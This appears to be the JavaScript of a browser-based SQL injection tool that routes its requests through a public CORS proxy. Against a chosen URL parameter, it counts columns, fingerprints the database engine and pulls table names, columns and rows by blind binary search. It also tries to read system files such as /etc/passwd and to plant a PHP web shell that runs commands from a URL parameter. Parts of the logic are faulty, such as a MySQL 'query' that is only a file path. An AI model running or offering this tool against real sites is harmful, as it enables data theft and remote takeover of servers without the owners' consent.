const f = document.getElementById("f");
const log = document.getElementById("log");

function out(m) {
  log.textContent += m + "\n";
  log.scrollTop = log.scrollHeight;
}

async function req(url, m, body) {
  const cors = "https://api.allorigins.win/raw?url=";
  return fetch(cors + encodeURIComponent(url), {
    method: m,
    body: m === "POST" ? body : undefined,
    headers: m === "POST" ? { "Content-Type": "application/x-www-form-urlencoded" } : {}
  }).then(r => r.text()).catch(() => "");
}

f.addEventListener("submit", async e => {
  e.preventDefault();
  log.textContent = "";
  const u = new URL(document.getElementById("url").value);
  const p = document.getElementById("par").value;
  const v = document.getElementById("val").value || "1";
  const m = document.getElementById("met").value;

  // 1) Columns count
  out("[*] Searching column count...");
  let cols = 0;
  for (let i = 1; i < 30; i++) {
    const pay = `' ORDER BY ${i}-- -`;
    const url2 = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay)}`;
    const res = await req(url2, m);
    if (/unknown column|order by|incorrect syntax|ora-/i.test(res)) {
      cols = i - 1;
      break;
    }
  }
  if (!cols) {
    out("[-] Cannot find columns");
    return;
  }
  out(`[+] Columns = ${cols}`);

  // 2) Engine + DB
  const engines = ["mysql", "pgsql", "ora", "mssql"];
  let eng = "mysql";
  for (const e of engines) {
    const q = {
      "mysql": "database()",
      "pgsql": "current_database()",
      "ora": "SYS_CONTEXT('USERENV','CURRENT_SCHEMA')",
      "mssql": "DB_NAME()"
    }[e];
    const pay = `' UNION SELECT ${q}-- -`;
    const url2 = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay)}`;
    const res = await req(url2, m);
    const m2 = res.match(/<[^>]*>(\w+)</);
    if (m2) {
      eng = e;
      out(`[+] Engine = ${eng}`);
      out(`[+] Database = ${m2[1]}`);
      break;
    }
  }

  // 3) Tables
  out("[*] Leaking tables...");
  let tbls = "";
  for (let pos = 1; pos <= 100; pos++) {
    let low = 32, high = 126;
    while (low <= high) {
      const mid = Math.floor((low + high) / 2);
      const q = {
        "mysql": `select group_concat(table_name) from information_schema.tables where table_schema=database()`,
        "pgsql": `select string_agg(table_name,',') from information_schema.tables where table_schema='public'`,
        "ora": `select listagg(table_name,',') within group (order by table_name) from all_tables where owner=SYS_CONTEXT('USERENV','CURRENT_SCHEMA')`,
        "mssql": `select string_agg(name,',') from sys.tables`
      }[eng];
      const pay = `' AND ASCII(SUBSTRING((${q}),${pos},1))>${mid}-- -`;
      const urlTrue = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay.replace(">", "="))}`;
      const urlFalse = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay)}`;
      const r1 = await req(urlTrue, m), r2 = await req(urlFalse, m);
      if (Math.abs(r1.length - r2.length) < 100) high = mid;
      else low = mid + 1;
    }
    if (low === 32) break;
    tbls += String.fromCharCode(low);
    out(`\r[+] Tables = ${tbls}`);
  }
  const tables = tbls.split(",").slice(0, 5);
  out(`\nTables = ${tables.join(", ")}`);

  // 4) Columns + Rows
  for (const t of tables) {
    if (!t) continue;
    out(`[*] Leaking columns for table "${t}"...`);
    let cols = "";
    for (let pos = 1; pos <= 100; pos++) {
      let low = 32, high = 126;
      while (low <= high) {
        const mid = Math.floor((low + high) / 2);
        const q = {
          "mysql": `select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='${t}'`,
          "pgsql": `select string_agg(column_name,',') from information_schema.columns where table_name='${t}'`,
          "ora": `select listagg(column_name,',') within group (order by column_name) from all_tab_columns where table_name='${t.toUpperCase()}'`,
          "mssql": `select string_agg(name,',') from sys.columns where object_id=object_id('dbo.${t}')`
        }[eng];
        const pay = `' AND ASCII(SUBSTRING((${q}),${pos},1))>${mid}-- -`;
        const urlTrue = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay.replace(">", "="))}`;
        const urlFalse = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay)}`;
        const r1 = await req(urlTrue, m), r2 = await req(urlFalse, m);
        if (Math.abs(r1.length - r2.length) < 100) high = mid;
        else low = mid + 1;
      }
      if (low === 32) break;
      cols += String.fromCharCode(low);
      out(`\r[+] Columns = ${cols}`);
    }
    const columns = cols.split(",");
    out(`\nColumns in ${t} = ${columns.join(", ")}`);

    // أول 10 سجلات من أول عمود
    const col = columns[0];
    if (!col) continue;
    out(`[*] Leaking rows from ${t}.${col}...`);
    let rows = "";
    for (let pos = 1; pos <= 200; pos++) {
      let low = 32, high = 126;
      while (low <= high) {
        const mid = Math.floor((low + high) / 2);
        const q = {
          "mysql": `select group_concat(${col}) from ${t}`,
          "pgsql": `select string_agg(${col}::text,',') from ${t}`,
          "ora": `select listagg(${col},',') within group (order by ${col}) from ${t}`,
          "mssql": `select string_agg(cast(${col} as varchar(max)),',') from ${t}`
        }[eng];
        const pay = `' AND ASCII(SUBSTRING((${q}),${pos},1))>${mid}-- -`;
        const urlTrue = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay.replace(">", "="))}`;
        const urlFalse = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay)}`;
        const r1 = await req(urlTrue, m), r2 = await req(urlFalse, m);
        if (Math.abs(r1.length - r2.length) < 100) high = mid;
        else low = mid + 1;
      }
      if (low === 32) break;
      rows += String.fromCharCode(low);
      out(`\r[+] Rows = ${rows}`);
    }
    out(`\nFirst 10 rows in ${t}.${col} = ${rows.split(",").slice(0, 10).join(", ")}\n`);
  }

  // 5) Files
  out("[*] Hunting files...");
  let files = "";
  for (let pos = 1; pos <= 200; pos++) {
    let low = 32, high = 126;
    while (low <= high) {
      const mid = Math.floor((low + high) / 2);
      const q = {
        "ora": "select listagg(directory_name,',') within group (order by directory_name) from all_directories",
        "pgsql": "select string_agg(l.oid::text,',') from pg_largeobject_metadata l",
        "mssql": "SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\boot.ini', SINGLE_CLOB) AS Contents",
        "mysql": "/etc/passwd"
      }[eng] || "";
      const pay = `' AND ASCII(SUBSTRING((${q}),${pos},1))>${mid}-- -`;
      const urlTrue = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay.replace(">", "="))}`;
      const urlFalse = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay)}`;
      const r1 = await req(urlTrue, m), r2 = await req(urlFalse, m);
      if (Math.abs(r1.length - r2.length) < 100) high = mid;
      else low = mid + 1;
    }
    if (low === 32) break;
    files += String.fromCharCode(low);
    out(`\r[+] Files = ${files}`);
  }
  out(`\nFiles content = ${files.slice(0, 300)}...`);

  // 6) WebShell
  out("[*] Trying to upload WebShell...");
  const shell = `<?php system($_GET["cmd"]); ?>`;
  const b64 = btoa(shell);
  const up = {
    "mysql": `select '${shell}' into outfile '/var/www/html/x.php'`,
    "pgsql": `copy (select '${shell}') to '/var/www/html/x.php'`,
    "mssql": `xp_cmdshell 'echo ${b64} > C:\\inetpub\\wwwroot\\x.php'`,
    "ora": `begin utl_file.put_line(utl_file.fopen('UTL_DIR','x.php','W'),'${shell}'); end;`
  }[eng];
  const pay = `'; ${up}-- -`;
  const urlUp = u.href + (u.search ? "&" : "?") + `${p}=${v}${encodeURIComponent(pay)}`;
  await req(urlUp, m);
  const shellUrl = u.origin + "/x.php";
  const chk = await req(shellUrl + "?cmd=id", "GET");
  if (chk.includes("uid=")) {
    out(`[+] WebShell uploaded -> ${shellUrl}?cmd=id`);
  } else {
    out("[-] WebShell upload failed");
  }

  out("\n[*] All done – copy report manually if needed.");
});